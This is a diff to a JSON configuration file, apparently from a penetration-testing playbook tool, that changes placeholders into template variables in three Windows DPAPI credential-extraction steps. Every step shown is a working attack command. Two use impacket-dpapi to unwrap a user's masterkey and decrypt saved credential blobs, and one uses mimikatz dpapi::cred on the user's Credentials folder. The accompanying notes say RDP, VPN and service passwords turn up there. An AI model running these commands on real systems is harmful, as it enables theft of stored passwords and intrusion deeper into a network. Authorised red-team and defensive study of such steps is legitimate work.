@@ -294,17 +294,17 @@
         },
         {
           "tool": "impacket-dpapi",
-          "run": "impacket-dpapi masterkey -file <masterkey-file> -sid <user-sid> -password '{{password}}'",
+          "run": "impacket-dpapi masterkey -file {{masterkey_file}} -sid {{user_sid}} -password '{{password}}'",
           "note": "Unwrap the masterkey with the user's password. The on-box counterpart is mimikatz dpapi::masterkey."
         },
         {
           "tool": "impacket-dpapi",
-          "run": "impacket-dpapi credential -file <credential-blob> -key <unwrapped-masterkey-hex>",
+          "run": "impacket-dpapi credential -file {{credential_blob}} -key {{masterkey_hex}}",
           "note": "Decrypt the blob using the unwrapped key. RDP credentials, VPN credentials, and service passwords all turn up here."
         },
         {
           "tool": "mimikatz",
-          "run": "mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\<blob>",
+          "run": "mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\{{blob}}",
           "note": "The on-box option for when you are executing as that user or as SYSTEM."
         }
       ]
